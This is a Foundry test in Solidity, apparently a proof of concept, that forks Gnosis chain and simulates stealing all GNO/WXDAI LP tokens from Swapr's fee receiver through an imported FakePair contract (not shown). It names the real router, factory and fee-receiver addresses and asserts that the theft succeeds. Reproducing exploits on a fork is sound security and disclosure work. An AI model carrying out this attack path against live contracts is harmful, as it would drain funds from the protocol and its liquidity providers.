pragma solidity 0.8.16;

import {Test} from "forge-std/Test.sol";
import {FakePair} from "../src/FakePair.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";

interface IDXswapRouter {
    function WETH() external pure returns (address payable);
}

// SPDX-License-Identifier: GPL-3.0-or-later
contract SimulateHack is Test {
    function setUp() public {
        // the fork is on gnosis chain at block 23729495
        vm.createSelectFork(
            "https://rpc.tenderly.co/fork/1fefd721-dbce-48e3-8766-8a4b8e63c884"
        );
    }

    function testHack() public {
        // swapr addresses on gc
        address _router = address(0xE43e60736b1cb4a75ad25240E2f9a62Bff65c0C0);
        address _factory = address(0x5D48C95AdfFD4B40c1AAADc4e08fc44117E02179);
        address _feeReceiver = address(
            0x65f29020d07A6CFa3B0bF63d749934d5A6E6ea18
        );

        // the account used for the simulation is a random one that had gno and
        // xdai at the fork's block
        address payable _account = payable(
            0xA21392dD4b12CB543Fb6d1e4e8759B3AC6e55169
        );
        vm.startPrank(_account);

        ERC20 _gno = ERC20(0x9C58BAcC331c9aa871AFD802DB6379a98e80CEdb); // gno on gc

        // we'll try to steal all the gno/wxdai lp tokens from the
        // fee receiver
        FakePair _fakePair = new FakePair();
        _gno.approve(address(_fakePair), 0.05 ether);

        // get the pre-hack balances of the LP token we want to steal to perform checks later
        address _stolenLPToken = pairFor(
            _factory,
            address(_gno),
            IDXswapRouter(_router).WETH()
        );
        uint256 _preHackHackerBalance = ERC20(_stolenLPToken).balanceOf(
            _account
        );
        assertEq(_preHackHackerBalance, 0);
        uint256 _preHackFeeReceiverBalance = ERC20(_stolenLPToken).balanceOf(
            _feeReceiver
        );
        assertTrue(_preHackFeeReceiverBalance > 0);

        _fakePair.steal{value: 0.5 ether}(
            address(_gno),
            0.05 ether, // amount of gno to provide to get some legit lp tokens
            _factory,
            _router,
            _feeReceiver
        );

        // check if we actually got what we wanted (check is >= because we performed
        // operations that minted protocol fees in the targeted pair)
        assertTrue(
            ERC20(_stolenLPToken).balanceOf(_account) >=
                _preHackFeeReceiverBalance
        );
        assertEq(ERC20(_stolenLPToken).balanceOf(_feeReceiver), 0);
    }

    /// @dev Calculates the correct address of a Swapr pair given token A and B (non ordered).
    /// @param _factory The Swapr factory address on the target chain.
    /// @param _tokenA One of the tokens in the pair.
    /// @param _tokenB The other token in the pair.
    /// @return The pair's address.
    function pairFor(
        address _factory,
        address _tokenA,
        address _tokenB
    ) internal pure returns (address) {
        (address _token0, address _token1) = _tokenA < _tokenB
            ? (_tokenA, _tokenB)
            : (_tokenB, _tokenA);
        return
            address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(
                                hex"ff",
                                _factory,
                                keccak256(abi.encodePacked(_token0, _token1)),
                                hex"d306a548755b9295ee49cc729e13ca4a45e00199bbd890fa146da43a50571776"
                            )
                        )
                    )
                )
            );
    }
}
